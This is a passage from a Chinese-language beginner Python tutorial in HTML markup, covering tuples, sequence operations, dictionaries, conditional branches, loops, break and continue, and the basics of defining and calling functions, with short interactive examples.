class="line"><span class="meta">&gt;&gt;&gt; </span>stu1[<span class="number">3</span>]</span><br><span class="line"><span class="number">59.9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1[<span class="number">3</span>] += <span class="number">0.1</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">&#x27;tuple&#x27;</span> <span class="built_in">object</span> does <span class="keyword">not</span> support item assignment</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-5-2-成员关系判断"><a href="#3-5-2-成员关系判断" class="headerlink" title="3.5.2 成员关系判断"></a>3.5.2 成员关系判断</h3><p>由于元组也是序列类型，所以作用在序列上的操作都可以作用于元组，通过<code>in</code>、<code>not in</code>判断成员关系</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">24</span> <span class="keyword">in</span> stu1</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-5-3-单元素元组"><a href="#3-5-3-单元素元组" class="headerlink" title="3.5.3 单元素元组"></a>3.5.3 单元素元组</h3><p>如果一个元组中只有一个元素，那么创建该元组的时候，需要加上一个逗号。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="string">&quot;cgji1&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(t)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="string">&quot;cgji1&quot;</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(t)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="3-6-序列"><a href="#3-6-序列" class="headerlink" title="3.6 序列"></a>3.6 序列</h2><p>字符串、列表、元组都是序列。</p><h3 id="3-6-1-序列类型操作符"><a href="#3-6-1-序列类型操作符" class="headerlink" title="3.6.1 序列类型操作符"></a>3.6.1 序列类型操作符</h3><table><thead><tr><th>序列操作符</th><th>作用</th></tr></thead><tbody><tr><td>序列偏移量，脚标[n]</td><td>获取脚标中的元素</td></tr><tr><td>序列切片，脚标[x:y]</td><td>取脚标之间的值，y 的值不取</td></tr><tr><td>序列 * n</td><td>重复输出n 次数</td></tr><tr><td>序列1 + 序列2</td><td>序列累加拼接</td></tr><tr><td>元素 in 序列</td><td>判断元素是否在字符串中</td></tr></tbody></table><h3 id="3-6-2内建函数"><a href="#3-6-2内建函数" class="headerlink" title="3.6.2内建函数"></a>3.6.2内建函数</h3><table><thead><tr><th>函数</th><th>含义</th></tr></thead><tbody><tr><td>list(可迭代对象)</td><td>转换为列表，可以将字符串转化为列表。</td></tr><tr><td>str(对象)</td><td>将对象转换为字符串</td></tr><tr><td>tuple(可迭代对象)</td><td>把可迭代对象转为元组</td></tr><tr><td>len(可迭代对象)</td><td>返回对象长度</td></tr><tr><td>enumerate(可迭代对象)</td><td>返回两个值一个脚标一个对应值</td></tr><tr><td>sorted(可迭代对象)</td><td>对迭代对象排序，返回一个有序列表</td></tr><tr><td>reversed(可迭代对象)</td><td>逆序迭代器</td></tr></tbody></table><h2 id="3-7-字典"><a href="#3-7-字典" class="headerlink" title="3.7 字典"></a>3.7 字典</h2><h3 id="3-7-1-字典定义"><a href="#3-7-1-字典定义" class="headerlink" title="3.7.1 字典定义"></a>3.7.1 字典定义</h3><p>字典是由<code>键-值(key-value) 对</code>构成的映射数据类型，通过键取值，不支持下标操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1 =  &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;cgji1&#x27;</span>, <span class="string">&quot;sex&quot;</span>: <span class="literal">True</span>, <span class="string">&quot;age&quot;</span>: <span class="number">24</span>, <span class="string">&quot;score&quot;</span>: <span class="number">59.9</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(stu1)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-7-2-创建字典"><a href="#3-7-2-创建字典" class="headerlink" title="3.7.2 创建字典"></a>3.7.2 创建字典</h3><p>出了可以通过<code>&#123; &#125;</code> 操作符创建字典，还可以通过<code>dict()</code> 工厂方法创建字典或者通过<code>fromkeys()</code> 创建具有相同值的默认字典</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2 = <span class="built_in">dict</span>(([<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;LL&#x27;</span>],[<span class="string">&#x27;sex&#x27;</span>,<span class="literal">True</span>],[<span class="string">&#x27;age&#x27;</span>,<span class="number">25</span>],[<span class="string">&#x27;score&#x27;</span>,<span class="number">69.9</span>]))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu2</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;LL&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">69.9</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu3 = &#123;&#125;.fromkeys((<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;sex&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;score&#x27;</span>),<span class="number">24</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu3</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">24</span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-7-3-访问字典"><a href="#3-7-3-访问字典" class="headerlink" title="3.7.3 访问字典"></a>3.7.3 访问字典</h3><p>字典是映射类型，意味着它没有下标，有键值对，访问字典中的值需要使用相应的键。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;stu1[<span class="string">&#x27;name&#x27;</span>]&#125;</span> 的成绩是<span class="subst">&#123;stu1[<span class="string">&#x27;score&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">cgji1 的成绩是<span class="number">59.9</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-7-4-更新字典元素"><a href="#3-7-4-更新字典元素" class="headerlink" title="3.7.4 更新字典元素"></a>3.7.4 更新字典元素</h3><p>通过键名更新字典键值：如果字典中有该键名，则更新对应的键值。如果字典中没有该键名，则向字典中添加键值对</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1[<span class="string">&#x27;score&#x27;</span>] += <span class="number">0.1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;stu1[<span class="string">&#x27;name&#x27;</span>]&#125;</span> 的成绩是<span class="subst">&#123;stu1[<span class="string">&#x27;score&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">cgji1 的成绩是<span class="number">60.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1[<span class="string">&#x27;e-mail&#x27;</span>] = <span class="string">&quot;2279913178@qq.com&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;cgji1&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">60.0</span>, <span class="string">&#x27;e-mail&#x27;</span>: <span class="string">&#x27;2279913178@qq.com&#x27;</span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-7-5-删除字典元素"><a href="#3-7-5-删除字典元素" class="headerlink" title="3.7.5 删除字典元素"></a>3.7.5 删除字典元素</h3><p>使用<code>pop()</code> 方法可以“弹出”字典中的元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1.pop(<span class="string">&quot;e-mail&quot;</span>)</span><br><span class="line"><span class="string">&#x27;2279913178@qq.com&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;cgji1&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;score&#x27;</span>: <span class="number">60.0</span>&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-7-6-字典的内建方法"><a href="#3-7-6-字典的内建方法" class="headerlink" title="3.7.6 字典的内建方法"></a>3.7.6 字典的内建方法</h3><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>d.copy()</td><td>返回字典的一个副本</td></tr><tr><td>d.get(key)</td><td>对字典dict 中的键key，返回它对应的值value， 如果字典中不存在此键，则返回default 的值</td></tr><tr><td>d.keys()</td><td>返回一个包含字典中键的列表</td></tr><tr><td>d.values()</td><td>返回一个包含字典中所有值的列表</td></tr><tr><td>d.update(dict2)</td><td>将字典dict2 的键-值对添加到字典dict</td></tr><tr><td>d.items()</td><td>返回一个包含字典中(键，值)对元组的列表</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1.keys()</span><br><span class="line">dict_keys([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;score&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1.values()</span><br><span class="line">dict_values([<span class="string">&#x27;cgji1&#x27;</span>, <span class="literal">True</span>, <span class="number">24</span>, <span class="number">65.0</span>])</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h1 id="4-流程控制"><a href="#4-流程控制" class="headerlink" title="4.流程控制"></a>4.流程控制</h1><h2 id="4-1-条件分支"><a href="#4-1-条件分支" class="headerlink" title="4.1 条件分支"></a>4.1 条件分支</h2><p> 通过if 语句进行学生成绩判断。</p><h3 id="4-1-1-单向条件分支"><a href="#4-1-1-单向条件分支" class="headerlink" title="4.1.1 单向条件分支"></a>4.1.1 单向条件分支</h3><p>如果学生成绩大于等于60 分，则输出“恭喜”。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 11 - 单向条件分支.py</span></span><br><span class="line"></span><br><span class="line">stu1 = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>  :   <span class="string">&quot;cgji1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sex&quot;</span>   :   <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>   :   <span class="number">24</span>,</span><br><span class="line">    <span class="string">&quot;score&quot;</span> :   <span class="number">69.9</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> stu1[<span class="string">&#x27;score&#x27;</span>] &gt;= <span class="number">60</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Congratulations!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="4-1-2-双向条件分支"><a href="#4-1-2-双向条件分支" class="headerlink" title="4.1.2 双向条件分支"></a>4.1.2 双向条件分支</h3><p>如果学生成绩大于等于60 分，则输出“恭喜”，否则输出“对不起！”。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 12 - 双向条件分支.py</span></span><br><span class="line"></span><br><span class="line">stu1 = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>  :   <span class="string">&quot;cgji1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sex&quot;</span>   :   <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>   :   <span class="number">24</span>,</span><br><span class="line">    <span class="string">&quot;score&quot;</span> :   <span class="number">59.9</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> stu1[<span class="string">&#x27;score&#x27;</span>] &gt;= <span class="number">60</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Congratulations!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sorry! You may need help!&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="4-1-3-多向条件分支"><a href="#4-1-3-多向条件分支" class="headerlink" title="4.1.3 多向条件分支"></a>4.1.3 多向条件分支</h3><p>可以根据学生成绩进行定级：</p><ul><li>如果学生成绩大于等于90 分，则定为A；</li><li>如果学生成绩大于等于80 分，则定为B；</li><li>如果学生成绩大于等于70 分，则定为C；</li><li>如果学生成绩大于等于60 分，则定为D；</li><li>如果学生成绩小于60 分，则定为不及格。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 13 - 多向条件分支.py</span></span><br><span class="line"></span><br><span class="line">stu1 = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>  :   <span class="string">&quot;cgji1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sex&quot;</span>   :   <span class="literal">True</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>   :   <span class="number">24</span>,</span><br><span class="line">    <span class="string">&quot;score&quot;</span> :   <span class="number">89.9</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> stu1[<span class="string">&#x27;score&#x27;</span>] &gt;= <span class="number">90</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> stu1[<span class="string">&#x27;score&#x27;</span>] &gt;= <span class="number">80</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;B&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> stu1[<span class="string">&#x27;score&#x27;</span>] &gt;= <span class="number">70</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;C&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> stu1[<span class="string">&#x27;score&#x27;</span>] &gt;= <span class="number">60</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;D&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sorry!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="4-2-if-判断条件探究"><a href="#4-2-if-判断条件探究" class="headerlink" title="4.2 if 判断条件探究"></a>4.2 if 判断条件探究</h2><p>紧接着if 关键字后的条件判断语句为<code>True</code>，则进入if 分支；否则进入else 分支。这里面判断语句的值大多数情况下，是非布尔类型变量。这种情况下，就会产生一个问题，什么样的表达式的值会被当做<code>True</code> 来看待，什么样的值会当做<code>False</code> 来看待。</p><p>基本原则：</p><ul><li>大部分非布尔类型的变量都会被认为是True 值。</li><li>少部分非布尔类型的变量会被认为是False 值。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 14 - if 判断条件探究.py</span></span><br><span class="line"></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line">flag = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = []</span><br><span class="line">flag = ()</span><br><span class="line">flag = &#123;&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> flag :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;flag&#125;</span> means True&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;flag&#125;</span> means False&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="4-3-循环结构"><a href="#4-3-循环结构" class="headerlink" title="4.3 循环结构"></a>4.3 循环结构</h2><p>输出1 到100 所有的整数。</p><h3 id="4-3-1-while-循环"><a href="#4-3-1-while-循环" class="headerlink" title="4.3.1 while 循环"></a>4.3.1 while 循环</h3><p>当需要语句不断的重复执行时，可以使用while 循环。while 循环中语句块会连续不断的执行，直到表达式的值为False。</p><p>当满足的条件的时候，则执行循环体。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 15 - while 循环.py</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="number">100</span> :</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>主要注意的问题：</p><ul><li>死循环问题</li><li>计数器</li></ul><h3 id="4-3-2-for-循环"><a href="#4-3-2-for-循环" class="headerlink" title="4.3.2 for 循环"></a>4.3.2 for 循环</h3><p>遍历，所有元素依次访问一遍。Python 中的for 接受可迭代对象（例如序列或迭代器）作为其参数，每次迭代其中一个元素。与while 循环一样，支持break、continue 语句。一般情况下，循环次数未知采用while 循环，循环次数已知（字符串，元组，列表，字典…），采用for 循环。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 16 - for 循环.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h2 id="4-4-特殊流程控制语句"><a href="#4-4-特殊流程控制语句" class="headerlink" title="4.4 特殊流程控制语句"></a>4.4 特殊流程控制语句</h2><h3 id="4-4-1-break-语句"><a href="#4-4-1-break-语句" class="headerlink" title="4.4.1 break 语句"></a>4.4.1 break 语句</h3><p>break 结束当前循环，跳出循环体。</p><p><code>快速猜数字</code>：程序随机生成一个数字，用户输入数字，程序判断大小。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 17 - 快速猜数字游戏.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">numRand = random.choice(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    numIn = <span class="built_in">input</span>(<span class="string">&quot;Please input a number: &quot;</span>)</span><br><span class="line">    numIn = <span class="built_in">int</span>(numIn)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> numIn &gt; numRand :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜大了&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> numIn &lt; numRand :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜小了&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span> : </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;猜对了&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="4-4-2-continue-语句"><a href="#4-4-2-continue-语句" class="headerlink" title="4.4.2 continue 语句"></a>4.4.2 continue 语句</h3><p>当触发continue 语句时，程序会忽略下方语句，回到循环的顶端继续循环，意味着本次循环“轮空”。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 18 - continue 语句.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">1</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><h1 id="5-函数"><a href="#5-函数" class="headerlink" title="5.函数"></a>5.函数</h1><p>需求：随机密码生成器。</p><p>逻辑上讲，函数就是一个功能；代码上讲，多条Python 语句的集合，语句块。</p><h2 id="5-1-函数介绍"><a href="#5-1-函数介绍" class="headerlink" title="5.1 函数介绍"></a>5.1 函数介绍</h2><h3 id="5-1-1-函数基本概念"><a href="#5-1-1-函数基本概念" class="headerlink" title="5.1.1 函数基本概念"></a>5.1.1 函数基本概念</h3><p>函数是对程序逻辑进行结构化或过程化的一种编程方法，将整块代码巧妙地隔离成易于管理的小块。把重复代码放到函数中而不是进行大量的拷贝，这样既能节省空间，也有助于保持一致性；通常函数都是用于实现某一种功能。</p><h3 id="5-1-2-创建函数"><a href="#5-1-2-创建函数" class="headerlink" title="5.1.2 创建函数"></a>5.1.2 创建函数</h3><p>Python 中函数是用<code>def</code> 语句来创建的，语法如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">function_name</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    定义一个函数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>标题行由def 关键字，函数的名字，以及参数的集合（如果有的话）组成。</p><p>def 子句（函数体）的部分包括: - （可选）体现为字符串的函数文档（函数说明，以及帮助等信息） - （必需）函数体</p><h3 id="5-1-3-调用函数"><a href="#5-1-3-调用函数" class="headerlink" title="5.1.3 调用函数"></a>5.1.3 调用函数</h3><p>同大多数语言相同，Python 用<code>()</code>调用函数：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 01 - 函数的定义和调用.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is function test&quot;</span>)</span><br><span class="line"></span><br><span class="line">test()</span><br></pre></td></tr></table></figure><p>函数调用过程：</p><ul><li>函数被调用时，会单独开辟一段私有的内存空间。</li><li>函数运行结束的之后，会回到调用函数的位置，继续向下执行。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 02 - 函数的调用过程.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;This is function a&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function b start...&quot;</span>)</span><br><span class="line">    a()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Function b stop!&quot;</span>)</span><br><span class="line"></span><br><span class="line">b()</span><br></pre></td></tr></table></figure><h3 id="5-1-4-前向引用"><a href="#5-1-4-前向引用" class="headerlink" title="5.1.4 前向引用"></a>5.1.4 前向引用</h3><p>先定义，后调用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>test()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;test&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">&quot;This is function test&quot;</span>)</span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test()</span><br><span class="line">This <span class="keyword">is</span> function test</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="5-1-5-函数返回值"><a href="#5-1-5-函数返回值" class="headerlink" title="5.1.5 函数返回值"></a>5.1.5 函数返回值</h3><p>多数情况下，函数并不直接打印数据，而是向调用者返回一个值：</p><ul><li>函数的返回值使用return 关键字</li><li>没有return 的话，函数默认返回None</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 03 - 函数的返回值.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    y = <span class="number">3</span></span><br><span class="line">    <span class="built_in">sum</span> = x + y</span><br><span class="line">    <span class="comment"># print(sum)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add() + <span class="number">7</span>)</span><br></pre></td></tr></table></figure><h2 id="5-2-函数参数"><a href="#5-2-函数参数" class="headerlink" title="5.2 函数参数"></a>5.2 函数参数</h2><h3 id="5-2-1-定义参数"><a href="#5-2-1-定义参数" class="headerlink" title="5.2.1 定义参数"></a>5.2.1 定义参数</h3><p>类似于数学上的代数，用字母表示数。参数分为：</p><table><thead><tr><th>参数类型</th><th>说明</th></tr></thead><tbody><tr><td>形式参数</td><td>函数定义时，紧跟在函数名后圆括号内的参数被称为形式参数，简称形参。 由于它不是实际存在变量，所以又称虚拟变量。</td></tr><tr><td>实际参数</td><td>函数调用时，函数名后面括号中的参数（可以是一个表达式） 称为“实际参数”，简称实参。</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 04 - 形参和实参.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="built_in">sum</span> = x + y</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add(<span class="number">10</span>, <span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>注意：实参要与形参一一对应。</p><h3 id="5-2-2-默认参数"><a href="#5-2-2-默认参数" class="headerlink" title="5.2.2 默认参数"></a>5.2.2 默认参数</h3><p>默认参数，不向该参数传入值也是允许的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 05 - 默认参数.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x = <span class="number">0</span>, y = <span class="number">0</span></span>):</span><br><span class="line">    <span class="built_in">sum</span> = x + y</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add())</span><br></pre></td></tr></table></figure><h3 id="5-2-3-关键字参数"><a href="#5-2-3-关键字参数" class="headerlink" title="5.2.3 关键字参数"></a>5.2.3 关键字参数</h3><p>关键字参数的概念仅仅针对函数的调用。这种理念是让调用者通过函数调用中的参数名字来区分参数。这样规范允许参数缺失或者不按顺序</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 06 - 关键字传参.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x = <span class="number">0</span>, y = <span class="number">0</span></span>):</span><br><span class="line">    <span class="built_in">sum</span> = x + y</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(add(y = <span class="number">10</span>, x = <span class="number">3</span>))</span><br></pre></td></tr></table></figure><h2 id="5-3-函数变量作用域"><a href="#5-3-函数变量作用域" class="headerlink" title="5.3 函数变量作用域"></a>5.3 函数变量作用域</h2><p>全局和局部的问题。</p><h3 id="5-3-1-局部变量"><a href="#5-3-1-局部变量" class="headerlink" title="5.3.1 局部变量"></a>5.3.1 局部变量</h3><p>局部变量是在函数内部定义的变量，随着函数的调用而被创建，函数调用完毕之后，即销毁。局部变量在函数调用后，才被创建，其作用范围，仅限于函数内部。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 07 - 局部变量.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    x = <span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)        <span class="comment">#NameError: name &#x27;x&#x27; is not defined</span></span><br></pre></td></tr></table></figure><h3 id="5-3-2-全局变量"><a href="#5-3-2-全局变量" class="headerlink" title="5.3.2 全局变量"></a>5.3.2 全局变量</h3><p>在函数外部定义的变量。</p><figure 